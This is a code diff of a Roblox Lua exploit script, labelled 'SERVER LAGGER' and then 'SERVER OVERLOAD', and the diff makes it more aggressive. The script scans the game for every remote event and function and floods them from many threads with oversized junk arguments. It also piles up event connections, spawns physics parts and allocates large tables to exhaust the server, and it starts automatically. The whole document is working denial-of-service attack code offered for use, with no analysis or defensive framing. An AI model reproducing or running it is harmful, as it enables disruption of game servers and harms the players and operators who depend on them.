@@ -1,146 +1,221 @@
 local Players = game:GetService("Players")
 local RS = game:GetService("ReplicatedStorage")
-local lp = Players.LocalPlayer
-local sg = Instance.new("ScreenGui")
-sg.Parent = game.CoreGui
-local mf = Instance.new("Frame")
-mf.Parent = sg
-mf.Size = UDim2.new(0,250,0,150)
-mf.Position = UDim2.new(0.5,-125,0.5,-75)
-mf.BackgroundColor3 = Color3.new(0.1,0.1,0.1)
-mf.Active = true
-mf.Draggable = true
-local tl = Instance.new("TextLabel")
-tl.Parent = mf
-tl.Size = UDim2.new(1,0,0,30)
-tl.BackgroundColor3 = Color3.new(0.2,0,0)
-tl.Text = "SERVER LAGGER"
-tl.TextColor3 = Color3.new(1,0.5,0.5)
-tl.Font = Enum.Font.Code
-local st = Instance.new("TextLabel")
-st.Parent = mf
-st.Position = UDim2.new(0,10,0,35)
-st.Size = UDim2.new(1,-20,0,40)
-st.BackgroundTransparency = 1
-st.Text = "READY"
-st.TextColor3 = Color3.new(0.5,1,0.5)
-st.Font = Enum.Font.Code
-st.TextXAlignment = Enum.TextXAlignment.Left
-local sb = Instance.new("TextButton")
-sb.Parent = mf
-sb.Position = UDim2.new(0.1,0,0,80)
-sb.Size = UDim2.new(0.35,0,0,30)
-sb.BackgroundColor3 = Color3.new(0.8,0.1,0.1)
-sb.Text = "START"
-sb.TextColor3 = Color3.new(1,1,1)
-sb.Font = Enum.Font.Code
-local eb = Instance.new("TextButton")
-eb.Parent = mf
-eb.Position = UDim2.new(0.55,0,0,80)
-eb.Size = UDim2.new(0.35,0,0,30)
-eb.BackgroundColor3 = Color3.new(0.2,0.2,0.2)
-eb.Text = "STOP"
-eb.TextColor3 = Color3.new(1,1,1)
-eb.Font = Enum.Font.Code
-local cb = Instance.new("TextButton")
-cb.Parent = mf
-cb.Position = UDim2.new(1,-25,0,5)
-cb.Size = UDim2.new(0,20,0,20)
-cb.BackgroundColor3 = Color3.new(0.8,0.1,0.1)
-cb.Text = "X"
-cb.TextColor3 = Color3.new(1,1,1)
-cb.Font = Enum.Font.Code
-local active = false
-local threads = {}
-local remotes = {events={},functions={}}
-local function scan(f)
-	for _,o in pairs(f:GetChildren()) do
-		if o:IsA("RemoteEvent") then
-			table.insert(remotes.events,o)
-		elseif o:IsA("RemoteFunction") then
-			table.insert(remotes.functions,o)
-		end
-		scan(o)
-	end
+local WS = workspace
+local LP = Players.LocalPlayer
+
+local SG = Instance.new("ScreenGui")
+SG.Parent = game:GetService("CoreGui")
+
+local MF = Instance.new("Frame")
+MF.Parent = SG
+MF.Size = UDim2.new(0, 280, 0, 200)
+MF.Position = UDim2.new(0.5, -140, 0.5, -100)
+MF.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MF.BorderColor3 = Color3.fromRGB(40, 40, 40)
+MF.Active = true
+MF.Draggable = true
+
+local TL = Instance.new("TextLabel")
+TL.Parent = MF
+TL.Size = UDim2.new(1, 0, 0, 30)
+TL.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
+TL.Text = "⚡ SERVER OVERLOAD ⚡"
+TL.TextColor3 = Color3.fromRGB(255, 50, 50)
+TL.Font = Enum.Font.Code
+
+local ST = Instance.new("TextLabel")
+ST.Parent = MF
+ST.Position = UDim2.new(0, 10, 0, 35)
+ST.Size = UDim2.new(1, -20, 0, 40)
+ST.BackgroundTransparency = 1
+ST.TextColor3 = Color3.fromRGB(100, 255, 100)
+ST.Font = Enum.Font.Code
+ST.TextXAlignment = Enum.TextXAlignment.Left
+
+local SB = Instance.new("TextButton")
+SB.Parent = MF
+SB.Position = UDim2.new(0.05, 0, 0, 80)
+SB.Size = UDim2.new(0.4, 0, 0, 30)
+SB.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+SB.Text = "START"
+SB.TextColor3 = Color3.fromRGB(255, 255, 255)
+SB.Font = Enum.Font.Code
+
+local SP = Instance.new("TextButton")
+SP.Parent = MF
+SP.Position = UDim2.new(0.55, 0, 0, 80)
+SP.Size = UDim2.new(0.4, 0, 0, 30)
+SP.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+SP.Text = "STOP"
+SP.TextColor3 = Color3.fromRGB(255, 255, 255)
+SP.Font = Enum.Font.Code
+
+local CB = Instance.new("TextButton")
+CB.Parent = MF
+CB.Position = UDim2.new(1, -25, 0, 5)
+CB.Size = UDim2.new(0, 20, 0, 20)
+CB.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+CB.Text = "X"
+CB.TextColor3 = Color3.fromRGB(255, 255, 255)
+CB.Font = Enum.Font.Code
+
+local ACT = false
+local THR = {}
+local REM = {ev = {}, fn = {}}
+
+local function SCAN(f)
+    for _, v in pairs(f:GetChildren()) do
+        if v:IsA("RemoteEvent") then
+            table.insert(REM.ev, v)
+        elseif v:IsA("RemoteFunction") then
+            table.insert(REM.fn, v)
+        end
+        SCAN(v)
+    end
 end
-scan(RS)
-scan(workspace)
-scan(game.ServerScriptService)
-scan(game.ServerStorage)
-if Status then
-	Status.Text = "REMOTES: " .. tostring(remoteCount)
+
+SCAN(RS)
+SCAN(WS)
+if game.ServerScriptService then SCAN(game.ServerScriptService) end
+if game.ServerStorage then SCAN(game.ServerStorage) end
+
+local RCOUNT = #REM.ev + #REM.fn
+ST.Text = "REMOTES: " .. tostring(RCOUNT)
+
+local function GEN()
+    local t = math.random(1, 5)
+    if t == 1 then return {string.rep("A", math.random(300, 800))} end
+    if t == 2 then return {math.random(1, 9999999)} end
+    if t == 3 then return {Vector3.new(math.random(-500, 500), math.random(-500, 500), math.random(-500, 500))} end
+    if t == 4 then
+        local tb = {}
+        for i = 1, math.random(20, 100) do tb[i] = {x = math.random(), y = math.random()} end
+        return {tb}
+    end
+    local big = {}
+    for i = 1, 1000 do big[i] = string.rep("Z", 100) end
+    return {big}
 end
-local function pl()
-	local t = math.random(1,4)
-	if t==1 then return {string.rep("X",math.random(200,800))} end
-	if t==2 then return {math.random(1,9999999)} end
-	if t==3 then return {Vector3.new(math.random(),math.random(),math.random())} end
-	local tb={}
-	for i=1,math.random(10,50) do tb[i]=math.random() end
-	return {tb}
+
+local function CON()
+    while ACT do
+        for i = 1, 20 do
+            pcall(function()
+                WS.ChildAdded:Connect(function() end)
+                game.Lighting.Changed:Connect(function() end)
+                game.RunService.Heartbeat:Connect(function() end)
+            end)
+        end
+        task.wait(0.02)
+    end
 end
-local function start()
-	if active then return end
-	active=true
-	sb.BackgroundColor3=Color3.new(0.1,0.8,0.1)
-	sb.Text="RUNNING"
-	st.Text="ATTACKING"
-	local tc=10
-	for i=1,tc do
-		local th=task.spawn(function()
-			while active do
-				for _,r in pairs(remotes.events) do
-					if not active then break end
-					pcall(function() r:FireServer(unpack(pl())) end)
-				end
-				for _,r in pairs(remotes.functions) do
-					if not active then break end
-					pcall(function() r:InvokeServer(unpack(pl())) end)
-				end
-				task.wait()
-			end
-		end)
-		table.insert(threads,th)
-	end
-	task.spawn(function()
-		while active do
-			for i=1,50 do
-				pcall(function()
-					workspace.ChildAdded:Connect(function() end)
-					game.Lighting.Changed:Connect(function() end)
-				end)
-			end
-			task.wait(0.1)
-		end
-	end)
-	task.spawn(function()
-		while active do
-			for i=1,20 do
-				pcall(function()
-					local p=Instance.new("Part")
-					p.Size=Vector3.new(10,10,10)
-					p.Position=Vector3.new(math.random(-200,200),math.random(10,100),math.random(-200,200))
-					p.Anchored=true
-					p.CanCollide=false
-					p.Parent=workspace
-					game.Debris:AddItem(p,5)
-				end)
-			end
-			task.wait(0.05)
-		end
-	end)
+
+local function PRT()
+    while ACT do
+        for i = 1, 10 do
+            pcall(function()
+                local p = Instance.new("Part")
+                p.Size = Vector3.new(math.random(5, 20), math.random(5, 20), math.random(5, 20))
+                p.Position = Vector3.new(math.random(-300, 300), math.random(10, 150), math.random(-300, 300))
+                p.Anchored = false
+                p.CanCollide = true
+                p.Velocity = Vector3.new(math.random(-100, 100), math.random(-100, 100), math.random(-100, 100))
+                p.RotVelocity = Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
+                p.Parent = WS
+                task.delay(2, function() if p then p:Destroy() end end)
+            end)
+        end
+        task.wait(0.05)
+    end
 end
-local function stop()
-	active=false
-	for _,t in pairs(threads) do pcall(task.cancel,t) end
-	threads={}
-	sb.BackgroundColor3=Color3.new(0.8,0.1,0.1)
-	sb.Text="START"
-	st.Text="STOPPED"
+
+local function TBL()
+    while ACT do
+        local bigtb = {}
+        for i = 1, 50 do
+            bigtb[i] = {}
+            for j = 1, 100 do
+                bigtb[i][j] = string.rep("M", 100)
+            end
+        end
+        task.wait(0.1)
+    end
 end
-sb.MouseButton1Click:Connect(start)
-eb.MouseButton1Click:Connect(stop)
-cb.MouseButton1Click:Connect(function() stop() sg:Destroy() end)
-game.Players.PlayerRemoving:Connect(function(p) if p==lp then stop() pcall(function() sg:Destroy() end) end end)
-task.wait(0.5)
-start()
+
+local function DST()
+    while ACT do
+        pcall(function()
+            for _, v in pairs(WS:GetChildren()) do
+                if v:IsA("Part") and v.Position.Y < 0 then
+                    v:Destroy()
+                end
+            end
+        end)
+        task.wait(0.05)
+    end
+end
+
+local function STR()
+    if ACT then return end
+    ACT = true
+    SB.BackgroundColor3 = Color3.fromRGB(30, 200, 30)
+    SB.Text = "RUNNING"
+    ST.Text = "OVERLOADING..."
+    
+    for i = 1, 15 do
+        local t = task.spawn(function()
+            while ACT do
+                for _, r in pairs(REM.ev) do
+                    if not ACT then break end
+                    pcall(function() r:FireServer(unpack(GEN())) end)
+                end
+                for _, r in pairs(REM.fn) do
+                    if not ACT then break end
+                    pcall(function() r:InvokeServer(unpack(GEN())) end)
+                end
+            end
+        end)
+        table.insert(THR, t)
+    end
+    
+    task.spawn(CON)
+    task.spawn(PRT)
+    task.spawn(TBL)
+    task.spawn(DST)
+    
+    task.spawn(function()
+        while ACT do
+            pcall(function()
+                for i = 1, 5 do
+                    local s = Instance.new("Sound")
+                    s.Parent = WS
+                    s:Destroy()
+                end
+            end)
+            task.wait(0.1)
+        end
+    end)
+end
+
+local function STP()
+    ACT = false
+    for _, t in pairs(THR) do pcall(task.cancel, t) end
+    THR = {}
+    SB.BackgroundColor3 = Color3.fromRGB(200, 30, 30)
+    SB.Text = "START"
+    ST.Text = "STOPPED"
+end
+
+SB.MouseButton1Click:Connect(STR)
+SP.MouseButton1Click:Connect(STP)
+CB.MouseButton1Click:Connect(function() STP() SG:Destroy() end)
+
+Players.PlayerRemoving:Connect(function(p)
+    if p == LP then
+        STP()
+        pcall(function() SG:Destroy() end)
+    end
+end)
+
+task.wait(1)
+STR()
